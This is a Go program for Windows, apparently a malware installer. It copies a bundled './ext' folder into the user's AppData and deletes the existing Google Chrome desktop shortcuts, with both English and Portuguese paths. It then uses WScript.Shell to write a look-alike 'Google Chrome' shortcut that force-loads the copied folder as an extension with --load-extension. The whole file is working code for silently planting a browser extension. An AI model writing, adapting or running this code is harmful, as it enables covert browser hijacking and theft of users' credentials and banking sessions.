package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func main() {
	var chromePathFinal string
	var shortcutPathFinal string
	src := "./ext"
	userprofile := filepath.Join(os.Getenv("USERPROFILE"))
	destinationPath := filepath.Join(userprofile, "AppData", "Local", "ext")
	// ---
	chromePaths := map[string]string{
		"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe":        userprofile + "\\Desktop\\Google Chrome.lnk",
		"C:\\Arquivos de Programa\\Google\\Chrome\\Application\\chrome.exe": userprofile + "\\Área de Trabalho\\Google Chrome.lnk",
	}

	for chromePath, shortcutPath := range chromePaths {
		if _, err := os.Stat(chromePath); err == nil {
			os.Remove(shortcutPath)
			os.Remove("C:\\Users\\Public\\Desktop\\Google Chrome.lnk")
			os.Remove("C:\\Usuários\\Público\\Área de Trabalho\\Google Chrome.lnk")
			chromePathFinal = chromePath
			shortcutPathFinal = shortcutPath
		}

	}
	// ---

	err := copyDir(src, destinationPath)
	if err != nil {
		log.Fatal(err)
	}

	// ---
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	wsh, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		log.Fatal(err)
	}
	defer wsh.Release()

	wshInterface, err := wsh.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		log.Fatal(err)
	}
	defer wshInterface.Release()

	cs, err := oleutil.CallMethod(wshInterface, "CreateShortcut", shortcutPathFinal)
	if err != nil {
		log.Fatal(err)
	}
	idispatch := cs.ToIDispatch()
	argmt := fmt.Sprintf("--load-extension=\"%s\"", destinationPath)
	oleutil.PutProperty(idispatch, "TargetPath", chromePathFinal)
	oleutil.PutProperty(idispatch, "Arguments", argmt)
	oleutil.CallMethod(idispatch, "Save")

}

// ---

func copyDir(src string, dst string) error {
	entries, err := ioutil.ReadDir(src)
	if err != nil {
		return err
	}

	os.MkdirAll(dst, os.ModePerm)

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		fileInfo, err := os.Stat(srcPath)
		if err != nil {
			return err
		}

		switch fileInfo.Mode() & os.ModeType {
		case os.ModeDir:
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		case os.ModeSymlink:
			if err := copySymLink(srcPath, dstPath); err != nil {
				return err
			}
		default:
			if err := copyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}
	return nil
}

func copyFile(src string, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	if _, err = io.Copy(dstFile, srcFile); err != nil {
		return err
	}
	return nil
}

func copySymLink(src string, dst string) error {
	link, err := os.Readlink(src)
	if err != nil {
		return err
	}
	return os.Symlink(link, dst)
}
